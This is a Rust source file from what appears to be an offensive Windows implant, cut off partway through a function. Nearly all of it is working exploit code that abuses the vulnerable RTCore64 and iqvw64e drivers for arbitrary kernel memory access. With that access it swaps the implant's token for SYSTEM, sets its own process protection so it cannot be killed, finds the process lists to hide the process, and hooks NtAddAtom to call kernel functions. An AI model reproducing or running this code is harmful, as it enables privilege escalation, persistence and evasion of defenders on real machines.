/// Ground-truth protection byte for any pid, straight from the OS:
/// `NtQueryInformationProcess(ProcessProtectionInformation)`.
fn true_protection(pid: u32) -> Option<u8> {
    let nt_open = unsafe { syscalls::resolve("NtOpenProcess") }?;
    let nt_query = unsafe { syscalls::resolve("NtQueryInformationProcess") }?;
    // OBJECT_ATTRIBUTES { 0x30, 0, null, 0, null } + CLIENT_ID { pid, 0 }
    let mut attributes = [0u64; 6];
    attributes[0] = 0x30;
    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;
    let mut handle: usize = 0;
    let status = unsafe {
        syscalls::dispatch6(
            nt_open,
            &mut handle as *mut usize as usize,
            0x1000, // PROCESS_QUERY_LIMITED_INFORMATION
            attributes.as_mut_ptr() as usize,
            client_id.as_mut_ptr() as usize,
            0,
            0,
        )
    };
    if status as u32 != 0 {
        return None;
    }
    let mut protection = [0u8; 8];
    let status = unsafe {
        syscalls::dispatch6(
            nt_query,
            handle,
            0x3D, // ProcessProtectionInformation
            protection.as_mut_ptr() as usize,
            protection.len(),
            0,
            0,
        )
    };
    if let Some(nt_close) = unsafe { syscalls::resolve("NtClose") } {
        unsafe { syscalls::dispatch6(nt_close, handle, 0, 0, 0, 0, 0) };
    }
    if status as u32 != 0 {
        return None;
    }
    Some(protection[0])
}

/// API-anchored discovery of the Protection offset: usermode asks the
/// OS for each sampled process's protection byte, then an offset is
/// valid only where kernel memory agrees with the API answer for EVERY
/// sample (unprotected zeros and at least two protected processes
/// required). Pattern heuristics chased volatile fields first - live
/// findings 2026-09-12.
pub(crate) fn discover_protection_offset(
    rw: &RwClient,
    system_eproc: u64,
    links_off: u64,
) -> Result<u64, String> {
    let head = system_eproc + links_off;
    let mut entry = rw.read64(head)?;
    let mut samples: Vec<(u64, u8)> = Vec::new();
    let mut hops = 0;
    while entry != head && hops < 128 && samples.len() < 40 {
        if !plausible_link(entry, links_off) {
            break;
        }
        let eproc = entry - links_off;
        let pid = rw.read64(eproc + EPROC_PID)? as u32;
        if let Some(byte) = true_protection(pid) {
            samples.push((eproc, byte));
        }
        entry = rw.read64(entry)?;
        hops += 1;
    }
    let protected = samples.iter().filter(|(_, b)| *b != 0).count();
    if samples.len() < 6 || protected < 2 {
        return Err(format!(
            "protection sampling too thin ({} samples, {} protected)",
            samples.len(),
            protected
        ));
    }
    let mut candidates: Vec<u64> = Vec::new();
    'offset: for offset in 0x400..0x1200u64 {
        for (eproc, expected) in &samples {
            if read8(rw, eproc + offset)? != *expected {
                continue 'offset;
            }
        }
        candidates.push(offset);
    }
    if candidates.len() != 1 {
        return Err(format!(
            "API-anchored protection scan: {} candidates {:?}",
            candidates.len(),
            candidates
        ));
    }
    Ok(candidates[0])
}

/// Protection = (Signer << 4) | Type; Type 1 = Light, 2 = Full, signers
/// 1..=0xC (PsProtectedSignerNone..WinTcb+). Kept as the semantic
/// reference for interpreting discovered bytes (the live discovery is
/// API-anchored; this table explains what the values mean).
#[cfg(test)]
fn plausible_protection(v: u8) -> bool {
    let kind = v & 0x0F;
    let signer = v >> 4;
    v != 0 && (kind == 1 || kind == 2) && (1..=0x0C).contains(&signer)
}

#[derive(Default)]
struct ProtectState {
    saved: Option<(u64, u8)>, // (address, original byte)
}

static PROTECT: std::sync::OnceLock<std::sync::Mutex<ProtectState>> = std::sync::OnceLock::new();

fn protect_store() -> &'static std::sync::Mutex<ProtectState> {
    PROTECT.get_or_init(|| std::sync::Mutex::new(ProtectState::default()))
}

/// DRIVER `protect on|off` action (ABR-T020).
pub fn protect(on: bool) -> Result<Vec<u8>, String> {
    let rw = RwClient::open_preferred()?;
    if !on {
        let (address, original) = protect_store()
            .lock()
            .unwrap()
            .saved
            .take()
            .ok_or("not protected (no saved state)")?;
        write8_verified(&rw, address, original)?;
        let restored = read8(&rw, address)?;
        if restored != original {
            return Err(format!(
                "restore readback {restored:#x} != {original:#x} - still protected"
            ));
        }
        return Ok(
            format!("protect: off (EPROCESS byte {original:#x} restored at {address:#x})")
                .into_bytes(),
        );
    }
    if protect_store().lock().unwrap().saved.is_some() {
        return Err("already protected - protect off first".into());
    }
    let base = ntoskrnl_base()?;
    let psis_rva = kernel_export_rva(|a| rw.read64(a), base, "PsInitialSystemProcess")?;
    let system_eproc = rw.read64(base + psis_rva as u64)?;
    let my_pid = std::process::id();
    let lists = discover_list_offsets(|a| rw.read64(a), system_eproc, my_pid)?;
    let own = try_walk(|a| rw.read64(a), system_eproc, lists[0], my_pid)?;
    let chosen = discover_protection_offset(&rw, system_eproc, lists[0])?;
    let sys_byte = read8(&rw, system_eproc + chosen)?;
    let mine_byte = read8(&rw, own + chosen)?;
    if mine_byte != 0 {
        return Err(format!(
            "implant already reads protected ({mine_byte:#x}) before any write"
        ));
    }
    write8_verified(&rw, own + chosen, sys_byte)?;
    let readback = read8(&rw, own + chosen)?;
    if readback != sys_byte {
        return Err(format!(
            "protect write did not stick ({readback:#x} != {sys_byte:#x})"
        ));
    }
    protect_store().lock().unwrap().saved = Some((own + chosen, mine_byte));
    let client = rw.name();
    Ok(format!(
        "protect: EPROCESS+{chosen:#x} {mine_byte:#x}->{sys_byte:#x} over {client} (offset API-anchored via ProcessProtectionInformation) - termination from unprotected contexts now denied"
    )
    .into_bytes())
}

/// DRIVER `gate` action (stage 3.5): capability survey and tier verdict
/// before any staging decision. Cheapest-first, all read-only except one
/// .data flag write with restore: device open, kernel read, writable
/// memory write, exec-capability survey. RX images honor PTE protection
/// (the 0xBE lab evidence), so code execution needs a writable AND
/// executable home - which this driver variant lacks: no physical path,
/// and INIT is re-protected read-only after DriverEntry.
pub fn gate() -> Result<Vec<u8>, String> {
    let rtcore = match RtCore64::open() {
        Ok(handle) => handle,
        Err(e) => {
            return Ok(format!("gate: tier 0 - no vulnerable-driver device ({e})").into_bytes());
        }
    };
    let base = ntoskrnl_base()?;
    let magic = rtcore.read(base, 2).unwrap_or(0);
    if magic != 0x5A4D {
        return Ok("gate: tier 0 - kernel read failed".as_bytes().to_vec());
    }
    let (drv_base, _) = match find_kernel_module("rtcore64") {
        Ok(found) => found,
        Err(_) => {
            return Ok("gate: tier 1 - read ok, driver module not found"
                .as_bytes()
                .to_vec())
        }
    };
    // Writable-memory proof with restore.
    let (data_va, data_size) = match kernel_section(|a| rtcore.read64(a), drv_base, b".data ") {
        Ok(found) => found,
        Err(_) => {
            return Ok("gate: tier 1 - no .data section to prove writes"
                .as_bytes()
                .to_vec())
        }
    };
    let scratch = match find_section_cave(&|a| rtcore.read64(a), drv_base, data_va, data_size, 0x10)
    {
        Ok(found) => found,
        Err(_) => return Ok("gate: tier 1 - no .data cave".as_bytes().to_vec()),
    };
    let flag: u64 = 0x1BADB002;
    let write_ok =
        rtcore.write64(scratch, flag).is_ok() && rtcore.read64(scratch).unwrap_or(0) == flag;
    rtcore.write64(scratch, 0).ok();
    if !write_ok {
        return Ok("gate: tier 1 - read ok, RW write failed"
            .as_bytes()
            .to_vec());
    }
    // Exec-capability survey: an RWX section that is still writable at
    // runtime. The INIT section advertises RWX in the header but is
    // re-protected read-only after DriverEntry (0xBE, lab Part 6), so
    // the survey reports it but cannot trust it without a live write -
    // which this variant has already failed twice. Verdict: data-plane
    // tier; code execution needs a call-primitive or physical driver.
    let rwx = find_rwx_section(|a| rtcore.read64(a), drv_base)
        .map(|(va, _)| format!("header-RWX at +{va:#x} (read-only at runtime)"))
        .unwrap_or_else(|_| "none".into());
    Ok(format!(
        "gate: tier 2 - data-plane ring-0 live (read ok, RW write ok, token/DKOM capable); code exec unavailable on this driver variant (rwx: {rwx}, no physical path) - shortlist a call-capable driver (iqvw64e) for stage-2 exec"
    )
    .into_bytes())
}

// ---------------------------------------------------------------------------
// Stage 3.3: structural offset discovery + the token-swap write proof.
// ---------------------------------------------------------------------------

/// `_EPROCESS.UniqueProcessId` for build 26200 - the one offset taken
/// from the table AND independently confirmed live (System reads 4).
/// It anchors the discovery of the other two: published offset tables
/// lag real builds (the 26200 row's Links=0x1D8 was stale for UBR
/// 9445 - that field held 0x70, a counter, lab report Part 5), so
/// ActiveProcessLinks and Token are DISCOVERED at runtime by
/// structural signature instead of trusted.
pub(crate) const EPROC_PID: u64 = 0x1D0;

/// Reads a user-supplied buffer through any 8-byte-capable read closure -
/// generic so tests can drive it with a stub instead of a live driver.
fn read_buf_via<F: Fn(u64) -> Result<u64, String>>(
    addr: u64,
    buf: &mut [u8],
    read64: F,
) -> Result<(), String> {
    for (index, chunk) in buf.chunks_mut(8).enumerate() {
        let value = read64(addr + (index * 8) as u64)?;
        chunk.copy_from_slice(&value.to_le_bytes()[..chunk.len()]);
    }
    Ok(())
}

/// Resolves an ntoskrnl export RVA by walking the IN-MEMORY export table
/// through the kernel-read primitive - no LoadLibrary of the kernel, no
/// symbol downloads. Mirrors the manual export walk used on user modules.
pub(crate) fn kernel_export_rva<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    base: u64,
    name: &str,
) -> Result<u32, String> {
    let mut headers = [0u8; 0x400];
    read_buf_via(base, &mut headers, &read64)?;
    if headers[0..2] != *b"MZ" {
        return Err("ntoskrnl base does not start with MZ".into());
    }
    let lfanew = u32::from_le_bytes(headers[0x3C..0x40].try_into().unwrap()) as usize;
    if lfanew + 0x18 + 0x70 + 8 > headers.len() {
        return Err("e_lfanew beyond header buffer".into());
    }
    if headers[lfanew..lfanew + 4] != *b"PE\0\0" {
        return Err("PE signature not found".into());
    }
    // Optional header data directory 0 (export) sits at optional+0x70.
    let optional = lfanew + 0x18;
    let export_rva = u32::from_le_bytes(
        headers[optional + 0x70..optional + 0x74]
            .try_into()
            .unwrap(),
    );
    let export_size = u32::from_le_bytes(
        headers[optional + 0x74..optional + 0x78]
            .try_into()
            .unwrap(),
    );
    if export_rva == 0 || export_size == 0 {
        return Err("ntoskrnl has no export directory".into());
    }
    let mut dir = [0u8; 0x28];
    read_buf_via(base + export_rva as u64, &mut dir, &read64)?;
    // _IMAGE_EXPORT_DIRECTORY: NumberOfFunctions @ 0x14, NumberOfNames
    // @ 0x18. Reading the count from 0x14 was the first lab crash's
    // root cause: it walks the names array past its end, feeds garbage
    // RVAs to the driver and bugchecks the box inside RTCore64
    // (0x3B at driver+0x14db, 2026-09-11 - lab report Part 5).
    let number_of_names = u32::from_le_bytes(dir[0x18..0x1C].try_into().unwrap()) as usize;
    if number_of_names == 0 || number_of_names > 0x4000 {
        return Err(format!("implausible NumberOfNames {number_of_names:#x}"));
    }
    let image_size = u32::from_le_bytes(
        headers[lfanew + 0x18 + 0x38..lfanew + 0x18 + 0x3C]
            .try_into()
            .unwrap(),
    ) as u64;
    let address_of_functions = u32::from_le_bytes(dir[0x1C..0x20].try_into().unwrap()) as u64;
    let address_of_names = u32::from_le_bytes(dir[0x20..0x24].try_into().unwrap()) as u64;
    let address_of_ordinals = u32::from_le_bytes(dir[0x24..0x28].try_into().unwrap()) as u64;
    for rva in [address_of_functions, address_of_names, address_of_ordinals] {
        if rva == 0 || rva >= image_size {
            return Err(format!("export array rva {rva:#x} outside image"));
        }
    }
    let mut name_rvas = vec![0u32; number_of_names];
    read_buf_via(
        base + address_of_names,
        bytemuck_rvas(&mut name_rvas),
        &read64,
    )?;
    let mut candidate = [0u8; 32];
    for (index, name_rva) in name_rvas.iter().enumerate() {
        if *name_rva == 0 || *name_rva as u64 >= image_size {
            // Defense in depth: never hand the driver an address derived
            // from a garbage RVA - a single wild read bugchecks the box.
            continue;
        }
        read_buf_via(base + *name_rva as u64, &mut candidate, &read64)?;
        let len = candidate
            .iter()
            .position(|b| *b == 0)
            .unwrap_or(candidate.len());
        if &candidate[..len] == name.as_bytes() {
            let mut ord_buf = [0u8; 2];
            read_buf_via(
                base + address_of_ordinals + (index * 2) as u64,
                &mut ord_buf,
                &read64,
            )?;
            let ordinal = u16::from_le_bytes(ord_buf) as u64;
            let mut fn_buf = [0u8; 4];
            let fn_rva = address_of_functions + ordinal * 4;
            if fn_rva + 4 >= image_size {
                return Err("function table entry outside image".into());
            }
            read_buf_via(base + fn_rva, &mut fn_buf, &read64)?;
            let resolved = u32::from_le_bytes(fn_buf);
            if resolved == 0 || resolved as u64 >= image_size {
                return Err(format!("resolved export rva {resolved:#x} outside image"));
            }
            return Ok(resolved);
        }
    }
    Err(format!("export {name} not found in ntoskrnl"))
}

/// Reinterprets a `&mut [u32]` as `&mut [u8]` without a bytemuck dep.
fn bytemuck_rvas(rvas: &mut [u32]) -> &mut [u8] {
    unsafe { std::slice::from_raw_parts_mut(rvas.as_mut_ptr() as *mut u8, rvas.len() * 4) }
}

/// Kernel pool pointers: canonical high-half range, LIST_ENTRY-aligned
/// for a links field at offset `links_off` of a 16-aligned EPROCESS.
fn plausible_link(value: u64, links_off: u64) -> bool {
    (0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&value)
        && value & 7 == 0
        && ((value.wrapping_sub(links_off)) & 0xF) == 0
}

/// One walk attempt of a candidate links offset. Every hop validates the
/// link's SHAPE before dereferencing anything through the driver: each
/// hop is a separate IOCTL, so a process dying mid-walk (or a wrong
/// candidate) can hand us a stale/garbage Flink - dereferencing it
/// bugchecks the box. An implausible link aborts the walk instead.
fn try_walk<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    system_eproc: u64,
    links_off: u64,
    pid: u32,
) -> Result<u64, String> {
    let head = system_eproc + links_off;
    let mut entry = read64(head)?;
    if !plausible_link(entry, links_off) {
        return Err(format!(
            "head link {entry:#x} implausible at +{links_off:#x}"
        ));
    }
    for hop in 0..512 {
        if !plausible_link(entry, links_off) {
            return Err(format!(
                "hop {hop}: implausible link {entry:#x} (candidate +{links_off:#x})"
            ));
        }
        let eproc = entry - links_off;
        let entry_pid = read64(eproc + EPROC_PID)?;
        if entry_pid > 0xFFFF_FFFF {
            return Err(format!("hop {hop}: pid field reads {entry_pid:#x}"));
        }
        if entry_pid == pid as u64 {
            return Ok(eproc);
        }
        entry = read64(eproc + links_off)?;
        if entry == head {
            break;
        }
    }
    Err(format!(
        "pid {pid} not found walking candidate +{links_off:#x}"
    ))
}

/// Discovers the `ActiveProcessLinks` offset by structural signature:
/// a candidate X has Flink/Blink at System+X/X+8 that look like pool
/// pointers into 16-aligned EPROCESS bases, and walking it from System
/// must terminate circularly and pass through `my_pid`. Thread-list
/// candidates fail the walk (garbage "pids", non-circular) and abort
/// safely.
fn discover_links_offset<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    system_eproc: u64,
    my_pid: u32,
) -> Result<u64, String> {
    discover_list_offsets(&read64, system_eproc, my_pid)?
        .first()
        .copied()
        .ok_or_else(|| "no candidate offset passed the ActiveProcessLinks signature".into())
}

/// Every offset in System's EPROCESS that behaves like a process list:
/// Flink/Blink look like EPROCESS-relative pool pointers and the walk
/// from System through the candidate is circular and passes our pid. On
/// build 26200 this yields TWO entries - the classic ActiveProcessLinks
/// and the modern PspAllProcess links (tasklist/NtQuerySystemInformation
/// enumerate the latter since 15063, so a full hide must unlink both).
fn discover_list_offsets<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    system_eproc: u64,
    my_pid: u32,
) -> Result<Vec<u64>, String> {
    let expected = live_process_count()?;
    let mut found = Vec::new();
    for x in (0x1D8..0xA00).step_by(8) {
        let flink = read64(system_eproc + x)?;
        let blink = read64(system_eproc + x + 8)?;
        if !plausible_link(flink, x) || !plausible_link(blink, x) {
            continue;
        }
        if try_walk(&read64, system_eproc, x, my_pid).is_err() {
            continue;
        }
        // Only GLOBAL process lists are safe to unlink: session/job/
        // thread lists also walk circularly through EPROCESS-shaped
        // entries but are strictly shorter than the live process count,
        // and unlinking one corrupts kernel-audited state (bugcheck
        // 0x139 arg3, 2026-09-11 — lab report Part 6).
        if let Ok(len) = list_length(&read64, system_eproc, x) {
            if len + 5 >= expected {
                found.push(x);
            }
        }
        if found.len() >= 3 {
            break;
        }
    }
    if found.is_empty() {
        return Err(format!(
            "no global process-list offset passed the signature (psi count {expected})"
        ));
    }
    Ok(found)
}

/// Ground-truth visibility oracle: does the REAL enumeration API
/// (`NtQuerySystemInformation(SystemProcessInformation)`) still list
/// this pid? Parsing here is what tasklist/Get-Process actually see -
/// UniqueProcessId sits at +0x50 in each entry (long-stable layout).
fn psi_contains_pid(pid: u32) -> Result<bool, String> {
    const SYSTEM_PROCESS_INFORMATION: usize = 5;
    let query = unsafe { syscalls::resolve("NtQuerySystemInformation") }
        .ok_or("NtQuerySystemInformation unresolved")?;
    const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC000_0004;
    let mut buffer = vec![0u8; 0x8000];
    loop {
        let mut needed = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                SYSTEM_PROCESS_INFORMATION,
                buffer.as_mut_ptr() as usize,
                buffer.len(),
                &mut needed as *mut usize as usize,
                0,
                0,
            )
        };
        let nt = status as u32 as i32;
        if nt >= 0 {
            break;
        }
        if nt as u32 != STATUS_INFO_LENGTH_MISMATCH {
            return Err(format!("process query failed: {nt:#010x}"));
        }
        let grow = if needed > buffer.len() {
            needed
        } else {
            buffer.len().saturating_mul(2)
        };
        buffer.resize(grow, 0);
    }
    let mut offset = 0usize;
    loop {
        if offset + 0x58 > buffer.len() {
            break;
        }
        let entry_pid =
            u64::from_le_bytes(buffer[offset + 0x50..offset + 0x58].try_into().unwrap());
        if entry_pid == pid as u64 {
            return Ok(true);
        }
        let next = u32::from_le_bytes(buffer[offset..offset + 4].try_into().unwrap()) as usize;
        if next == 0 {
            break;
        }
        offset += next;
    }
    Ok(false)
}

/// Two-pass discovery: process churn between the psi count and the
/// walks can transiently drop the modern enumeration list (live
/// finding 2026-09-12 - one pass found a single list and the hidden
/// implant stayed visible). A second pass with a fresh count fixes the
/// common case; the hide oracle below still fails closed on a miss.
pub(crate) fn discover_list_offsets_retrying<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    system_eproc: u64,
    my_pid: u32,
) -> Result<Vec<u64>, String> {
    let first = discover_list_offsets(&read64, system_eproc, my_pid)?;
    if first.len() >= 2 {
        return Ok(first);
    }
    let second = discover_list_offsets(&read64, system_eproc, my_pid)?;
    if second.len() > first.len() {
        Ok(second)
    } else {
        Ok(first)
    }
}

/// Count of live processes from SystemProcessInformation — the size
/// reference separating the two global process lists from every other
/// EPROCESS-internal list.
fn live_process_count() -> Result<usize, String> {
    const SYSTEM_PROCESS_INFORMATION: usize = 5;
    let query = unsafe { syscalls::resolve("NtQuerySystemInformation") }
        .ok_or("NtQuerySystemInformation unresolved")?;
    const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC000_0004;
    let mut buffer = vec![0u8; 0x8000];
    loop {
        let mut needed = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                SYSTEM_PROCESS_INFORMATION,
                buffer.as_mut_ptr() as usize,
                buffer.len(),
                &mut needed as *mut usize as usize,
                0,
                0,
            )
        };
        let nt = status as u32 as i32;
        if nt >= 0 {
            break;
        }
        if nt as u32 != STATUS_INFO_LENGTH_MISMATCH {
            return Err(format!("process count query failed: {nt:#010x}"));
        }
        let grow = if needed > buffer.len() {
            needed
        } else {
            buffer.len().saturating_mul(2)
        };
        if grow > 0x80_0000 {
            return Err("process count query size runaway".into());
        }
        buffer.resize(grow, 0);
    }
    let mut count = 0usize;
    let mut offset = 0usize;
    loop {
        if offset + 4 > buffer.len() {
            break;
        }
        let next = u32::from_le_bytes(buffer[offset..offset + 4].try_into().unwrap()) as usize;
        count += 1;
        if next == 0 {
            break;
        }
        offset += next;
    }
    Ok(count)
}

/// Length of a candidate list: hops from System's entry back to itself.
fn list_length<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    system_eproc: u64,
    links_off: u64,
) -> Result<usize, String> {
    let head = system_eproc + links_off;
    let mut entry = read64(head)?;
    let mut hops = 0usize;
    loop {
        if !plausible_link(entry, links_off) || hops > 2048 {
            return Err("candidate walk broken".into());
        }
        entry = read64(entry)?;
        hops += 1;
        if entry == head {
            return Ok(hops);
        }
    }
}

/// `_TOKEN.AuthenticationId` sits at +0x18 - the SYSTEM logon session
/// LUID is 0x3E7. Pool tags cannot serve here: the 24H2+ pool allocator
/// obfuscates tags, and the first lab run proved no `Toke`-style check
/// survives this build.
fn token_object_is_system<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    token_object: u64,
) -> Result<bool, String> {
    Ok(read64(token_object + 0x18)? == 0x3E7)
}

/// Discovers the `Token` offset: a candidate X must hold EX_FAST_REF
/// values in BOTH System and our EPROCESS, pointing at distinct objects,
/// and the System-side object AuthenticationId must read the SYSTEM LUID.
fn discover_token_offset<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    system_eproc: u64,
    own_eproc: u64,
) -> Result<u64, String> {
    for x in (0x100..0x1000).step_by(8) {
        let system_token = read64(system_eproc + x)?;
        let own_token = read64(own_eproc + x)?;
        if !looks_like_fast_ref(system_token) || !looks_like_fast_ref(own_token) {
            continue;
        }
        if system_token & !0xF == own_token & !0xF {
            continue;
        }
        if token_object_is_system(&read64, system_token & !0xF)? {
            return Ok(x);
        }
    }
    Err("no candidate offset passed the Token signature".into())
}

fn looks_like_fast_ref(value: u64) -> bool {
    // EX_FAST_REF: a kernel-canonical pointer; the low nibble is a hint
    // refcount masked off before any dereference, so its value is not
    // part of the shape check (a live run carried a nibble above 7).
    value >= 0xFFFF_8000_0000_0000
}

/// Opens the raw SAM hive file through CreateFileW. Its DACL grants read
/// to SYSTEM only, so a success is a crisp in-process proof that the
/// swapped token is live - deliberately a pure access check: the first
/// lab attempt proved SYSTEM with `RegOpenKeyExW(HKLM\SAM\SAM)` instead,
/// which drags the Configuration Manager into mounting the hive while
/// the token is swapped, and bugchecked the box (0x3B, 2026-09-11 - lab
/// report Part 4).
fn sam_readable() -> Result<bool, String> {
    let win32 = unsafe { Win32::resolve()? };
    const GENERIC_READ: u32 = 0x8000_0000;
    const OPEN_EXISTING: u32 = 3;
    let path: Vec<u16> = "C:\\Windows\\System32\\config\\SAM"
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let handle = unsafe {
        (win32.create_file_w)(
            path.as_ptr(),
            GENERIC_READ,
            1, // FILE_SHARE_READ
            std::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            std::ptr::null_mut(),
        )
    };
    if handle as usize == usize::MAX || handle.is_null() {
        return Ok(false);
    }
    unsafe { (win32.close_handle)(handle) };
    Ok(true)
}

/// DRIVER `elevate` action (ABR-T015): the arbitrary-write proof. Swaps
/// the implant's EPROCESS token for the System token, proves SYSTEM from
/// the same thread (SAM hive DACL becomes readable), then restores the
/// original token - no lingering swapped state. Every structural
/// assumption is validated before the single write happens; Links and
/// Token offsets come from the runtime structural discovery.
pub fn elevate() -> Result<Vec<u8>, String> {
    let rtcore =
        RwClient::open_preferred().map_err(|e| format!("no vulnerable-driver device: {e}"))?;
    let base = ntoskrnl_base()?;
    let psis_rva = kernel_export_rva(|a| rtcore.read64(a), base, "PsInitialSystemProcess")?;
    let system_eproc = rtcore.read64(base + psis_rva as u64)?;
    if system_eproc < 0xFFFF_8000_0000_0000 {
        return Err(format!(
            "PsInitialSystemProcess implausible: {system_eproc:#x}"
        ));
    }
    let my_pid = std::process::id();
    let links_off = discover_links_offset(|a| rtcore.read64(a), system_eproc, my_pid)?;
    let own_eproc = try_walk(|a| rtcore.read64(a), system_eproc, links_off, my_pid)?;
    let token_off = discover_token_offset(|a| rtcore.read64(a), system_eproc, own_eproc)?;
    let system_token = rtcore.read64(system_eproc + token_off)?;
    let own_token = rtcore.read64(own_eproc + token_off)?;
    if !looks_like_fast_ref(system_token) || !looks_like_fast_ref(own_token) {
        return Err(format!(
            "token slots implausible (system {system_token:#x}, own {own_token:#x}) - offset drift"
        ));
    }
    let before = sam_readable()?;
    // EX_FAST_REF copy: take the System token object, keep our refcount
    // nibble.
    let swapped = (system_token & !0xF) | (own_token & 0xF);
    rtcore
        .write64_verified(own_eproc + token_off, swapped)
        .map_err(|e| format!("token write failed: {e}"))?;
    // Degrade-not-skip: a failed READ here must still fall through to
    // the restore below - the `?` variant returned with the token
    // still swapped (audit finding).
    let readback = rtcore.read64(own_eproc + token_off).unwrap_or(0);
    let after = sam_readable().unwrap_or(false);
    // Restore before reporting so a failure below cannot leave the
    // process wedged on a foreign token.
    rtcore
        .write64_verified(own_eproc + token_off, own_token)
        .map_err(|e| format!("CRITICAL: restore failed, token left swapped: {e}"))?;
    let restored = rtcore.read64(own_eproc + token_off)?;
    let report = format!(
        "elevate: swap {own_token:#x}->{swapped:#x} rb {readback:#x}; SAM {before}/{after}; restored={}",
        restored == own_token
    );
    Ok(report.into_bytes())
}

// ---------------------------------------------------------------------------
// iqvw64e client (Intel e1000 "Nal" driver, the KdMapper family): virtual
// memcpy, physical translation, MmMapIoSpace-based RX writes AND a real
// kernel CALL primitive. Protocol ported from the kdmapper reference
// implementation (device \\.\Nal, IOCTL 0x80862007, case-tagged buffers).
// ---------------------------------------------------------------------------

/// `COPY_MEMORY_BUFFER_INFO` — arbitrary kernel/user virtual memcpy.
#[repr(C)]
struct NalCopy {
    case_number: u64, // 0x33
    reserved: u64,
    source: u64,
    destination: u64,
    length: u64,
}
/// `GET_PHYS_ADDRESS_BUFFER_INFO` — VA to PA translation, result in-buffer.
#[repr(C)]
struct NalGetPhys {
    case_number: u64, // 0x25
    reserved: u64,
    return_physical_address: u64,
    address_to_translate: u64,
}
/// `MAP_IO_SPACE_BUFFER_INFO` — MmMapIoSpace(pa, size, MmNonCached) call,
/// result in-buffer.
#[repr(C)]
struct NalMapIo {
    case_number: u64, // 0x19
    reserved: u64,
    return_value: u64,
    return_virtual_address: u64,
    physical_address_to_map: u64,
    size: u32,
    pad: u32,
}
/// `UNMAP_IO_SPACE_BUFFER_INFO`.
#[repr(C)]
struct NalUnmapIo {
    case_number: u64, // 0x1A
    reserved1: u64,
    reserved2: u64,
    virt_address: u64,
    reserved3: u64,
    number_of_bytes: u32,
    pad: u32,
}

/// The iqvw64e client. Unlike RTCore64 (R/W-only), this driver can CALL
/// arbitrary kernel functions: a 12-byte `movabs rax, target; jmp rax`
/// stub is written over `nt!NtAddAtom` through the physical mapping path
/// (bypassing page protection), the usermode `NtAddAtom` syscall then
/// executes the target with the marshaled arguments, and the original
/// bytes are restored. The syscall's return value IS the target's RAX.
pub struct Iqvw64e {
    device: *mut c_void,
    win32: Win32,
}

const NAL_IOCTL: u32 = 0x8086_2007;

impl Iqvw64e {
    pub fn open() -> Result<Self, String> {
        let win32 = unsafe { Win32::resolve()? };
        let path: Vec<u16> = r"\\.\Nal"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let device = unsafe {
            (win32.create_file_w)(
                path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                std::ptr::null_mut(),
                OPEN_EXISTING,
                0,
                std::ptr::null_mut(),
            )
        };
        if device as usize == usize::MAX || device.is_null() {
            return Err("Nal device not available (\\\\.\\Nal)".into());
        }
        Ok(Iqvw64e { device, win32 })
    }

    fn ioctl(&self, buffer: &mut [u8]) -> bool {
        let mut returned = 0u32;
        unsafe {
            (self.win32.device_io_control)(
                self.device,
                NAL_IOCTL,
                buffer.as_mut_ptr() as *mut c_void,
                buffer.len() as u32,
                buffer.as_mut_ptr() as *mut c_void,
                buffer.len() as u32,
                &mut returned,
                std::ptr::null_mut(),
            ) != 0
        }
    }

    /// Arbitrary virtual memcpy: `source` -> `destination` (either side
    /// may be the user buffer).
    fn mem_copy(&self, source: u64, destination: u64, length: u64) -> Result<(), String> {
        let request = NalCopy {
            case_number: 0x33,
            reserved: 0,
            source,
            destination,
            length,
        };
        if !self.ioctl(unsafe {
            std::slice::from_raw_parts_mut(
                &request as *const NalCopy as *mut u8,
                std::mem::size_of::<NalCopy>(),
            )
        }) {
            return Err("Nal mem_copy failed".into());
        }
        Ok(())
    }

    pub fn read64(&self, address: u64) -> Result<u64, String> {
        let mut value = [0u8; 8];
        self.mem_copy(address, value.as_mut_ptr() as u64, 8)?;
        Ok(u64::from_le_bytes(value))
    }

    pub fn write64(&self, address: u64, value: u64) -> Result<(), String> {
        self.mem_copy(&value as *const u64 as u64, address, 8)
    }

    pub fn read_buf(&self, address: u64, out: &mut [u8]) -> Result<(), String> {
        self.mem_copy(address, out.as_mut_ptr() as u64, out.len() as u64)
    }

    pub fn write_buf(&self, address: u64, data: &[u8]) -> Result<(), String> {
        self.mem_copy(data.as_ptr() as u64, address, data.len() as u64)
    }

    fn get_physical(&self, address: u64) -> Result<u64, String> {
        let mut request = NalGetPhys {
            case_number: 0x25,
            reserved: 0,
            return_physical_address: 0,
            address_to_translate: address,
        };
        if !self.ioctl(unsafe {
            std::slice::from_raw_parts_mut(
                &mut request as *mut NalGetPhys as *mut u8,
                std::mem::size_of::<NalGetPhys>(),
            )
        }) {
            return Err("Nal get_physical failed".into());
        }
        Ok(request.return_physical_address)
    }

    fn map_io_space(&self, physical: u64, size: u32) -> Result<u64, String> {
        let mut request = NalMapIo {
            case_number: 0x19,
            reserved: 0,
            return_value: 0,
            return_virtual_address: 0,
            physical_address_to_map: physical,
            size,
            pad: 0,
        };
        if !self.ioctl(unsafe {
            std::slice::from_raw_parts_mut(
                &mut request as *mut NalMapIo as *mut u8,
                std::mem::size_of::<NalMapIo>(),
            )
        }) {
            return Err("Nal map_io_space failed".into());
        }
        if request.return_virtual_address == 0 {
            return Err("Nal map_io_space returned null".into());
        }
        Ok(request.return_virtual_address)
    }

    fn unmap_io_space(&self, address: u64, size: u32) -> Result<(), String> {
        let request = NalUnmapIo {
            case_number: 0x1A,
            reserved1: 0,
            reserved2: 0,
            virt_address: address,
            reserved3: 0,
            number_of_bytes: size,
            pad: 0,
        };
        if !self.ioctl(unsafe {
